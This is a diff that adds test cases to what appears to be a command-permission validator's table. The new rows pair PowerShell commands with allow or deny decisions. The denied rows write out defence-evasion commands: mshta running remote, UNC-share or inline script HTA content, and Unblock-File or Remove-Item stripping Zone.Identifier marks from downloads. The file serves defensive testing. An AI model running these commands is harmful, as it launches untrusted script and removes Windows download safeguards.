@@ -34,6 +34,16 @@ vc PowerShell 'mshta https://x.invalid/a.hta'               "mshta remote HTA"  
 vc PowerShell 'mshta.exe vbscript:Execute(x)'               "mshta inline vbscript"       deny
 vc PowerShell 'Unblock-File -Path C:\\t\\helper.exe'          "Unblock-File"                deny
 vc PowerShell 'mshta C:\\tools\\local.hta'                  "mshta a local HTA"           allow
+# 2026-11-22 (#349 review); single backslashes, as PowerShell writes them
+vc PowerShell 'mshta "about:<script>new ActiveXObject(1).Run(2)</script>"' "mshta about: page" deny
+vc PowerShell 'mshta \\host\share\a.hta'                 "mshta UNC share"             deny
+vc PowerShell 'Remove-Item .\setup.exe -Stream Zone.Identifier' "Remove-Item -Stream Zone.Identifier" deny
+vc PowerShell 'Remove-Item -Path C:\x\setup.exe:Zone.Identifier' "Remove-Item path:Zone.Identifier" deny
+vc PowerShell 'Get-ChildItem .\dl | Unblock-File'          "piped Unblock-File"          deny
+vc PowerShell 'Get-Help Unblock-File'                     "Get-Help Unblock-File"       allow
+vc PowerShell 'Get-Command Unblock-File'                  "Get-Command Unblock-File"    allow
+vc PowerShell 'Select-String -Pattern "Unblock-File" -Path notes.md' "Select-String for Unblock-File" allow
+vc PowerShell 'Get-Item .\setup.exe -Stream Zone.Identifier' "Get-Item reads the stream"  allow
 vc PowerShell 'Get-Item C:\\t\\a.txt'                       "an unrelated cmdlet"         allow
 
 # --- plain API endpoint/token redirect: notice, not a decision ---
